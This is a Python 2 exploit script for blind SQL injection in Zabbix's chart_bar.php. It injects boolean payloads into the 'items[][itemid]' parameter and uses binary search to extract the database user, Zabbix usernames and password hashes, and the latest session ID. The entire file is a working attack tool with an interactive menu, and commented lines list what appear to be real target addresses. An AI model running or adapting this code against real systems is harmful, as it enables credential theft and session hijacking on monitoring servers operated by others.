#!/usr/bin/python2.7
#-*- coding:utf-8 -*-

import urllib
import urllib2
import sys

class ZabbixInject(object):

	def __init__(self, url):
		self.url = url
		self.normal_poc = '1000 or 1=1-- -'
		self.normal_code = 0
		self.max_val = 127
		self.min_val = 0
		self.cookie = None

	def bInject(self):
		try:
			request = urllib2.Request(self.url)
			request.add_header('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0')
			resp = urllib2.urlopen(request, timeout=15)
			#cookie = 'zbx_sessionid=9f8a6bf1d9a8efb3e4c7397a5094bc5c'
			self.cookie = resp.info()['Set-Cookie'].split(',')[0]
		except Exception,e:
			print "[-]....request url:%s error!" % str(self.url) 
			return False
			
		self.normal_code = self.getLength(self.normal_poc)  #正常查询、返回表trends所有数据
		return self.bReturnOk("1000 or 1=2-- -")
		
	def getLength(self, itemid_poc):
		if self.cookie is not None:
			parameter = {'config': 1,
						 'items[][itemid]' : itemid_poc}

			request = urllib2.Request(self.url)
			request.add_header('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0')
			request.add_header('Cookie',self.cookie)
			post_data = urllib.urlencode(parameter)
			common_resp = urllib2.urlopen(request, post_data, timeout=15)
			retlength = len(common_resp.read())
			#print 'itemid_poc:%s len:%d' % (itemid_poc, retlength)
			return retlength
		else:
			return 0
	
	def bReturnOk(self, itemid_poc):
		'''
		判断POC 盲注是否报错
		'''
		if self.normal_code != 0:
			if ( (self.normal_code + 200) < self.getLength(itemid_poc)):
				return True
			else:
				return False
	
	def poc(self):
		if self.bInject():
			print '[+]...target url:%s is vulnerable!' % self.url	
			print '''
				\rchoice item:
				\r1.Get current DB user
				\r2.Get Zabbix User/Pass
				\r3.Get Zabbix Session
			  '''
			choice = raw_input('please input choice(1/2/3):')
			if choice == '1':
				#1. mysql get user()
				sys.stdout.write('current_user:')
				self.injectResult('USER')
			elif choice == '2':
				limit_count = 0
				bcontinue = True
				while bcontinue:
					sys.stdout.write('zabbix user:')
					bcontinue = self.injectResult('USERNAME', limit_count)		
					sys.stdout.write('zabbix passwd:')
					bcontinue = self.injectResult('PASSWD', limit_count)
					limit_count = limit_count + 1
					sys.stdout.write("\r\n")
			elif choice == '3':
				sys.stdout.write('sessionid:')
				self.injectResult('SESSIONID')
			else:
				sys.exit()
		else:
			print '[+]...target url:%s is safety!' % self.url		

	

	def injectResult(self, poc_type, limit_count = 0):
		ipos = 1
		while True:
			result_chr = chr(self.match(poc_type,ipos,limit_count))
			if result_chr == chr(0):
				break
			sys.stdout.write(result_chr)
			ipos = ipos + 1
		sys.stdout.write("\r\n")
		if ipos == 1:
			return False
		else:
			return True

	def match(self, poc_type,ipos, limit_count = 0):
		'''
		二分法
		'''
		max_val = self.max_val
		min_val = self.min_val
		while min_val < max_val:
			mid_val = (min_val + max_val) / 2 
			if poc_type == 'USER':
				itemid_poc = "1000 or 1=1 and (select ascii(substr(user(), %d, 1))) > %d-- -" % (ipos, mid_val)
			elif poc_type == 'USERNAME':
				itemid_poc = "1000 or 1=1 and (select ascii(substr(alias, %d ,1)) from zabbix.users limit %d,1) > %d-- -" % (ipos, limit_count,mid_val)
			elif poc_type == 'PASSWD':
				itemid_poc = "1000 or 1=1 and (select ascii(substr(passwd, %d ,1)) from zabbix.users limit %d,1) > %d-- -" % (ipos, limit_count,mid_val)
			elif poc_type == 'SESSIONID':
				itemid_poc = "1000 or 1=1 and (select ascii(substr(sessionid, %d ,1)) from zabbix.sessions order by lastaccess desc limit 0,1) > %d-- -" % (ipos,mid_val)
				
			if self.bReturnOk(itemid_poc):
				#sql盲注报错，需要减小猜测值
				if abs(max_val - min_val) == 1:
					return min_val		
				max_val = mid_val
			else:
				#sql盲注不报错了，继续增大猜测值
				if abs(max_val - min_val) == 1:
					return max_val
				min_val = mid_val
		return mid_val

def main(url):
	#url = "http://10.10.138.138/zabbix/chart_bar.php"
	#url = "http://211.151.13.149:8080/zabbix/chart_bar.php"
	#url = "https://101.227.20.154/zabbix/chart_bar.php"
	zabbix_inject = ZabbixInject(url + '/chart_bar.php')
	zabbix_inject.poc()

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print 'Usage python %s http://xxx.com/zabbix' % sys.argv[0]
	else:
		main(sys.argv[1])

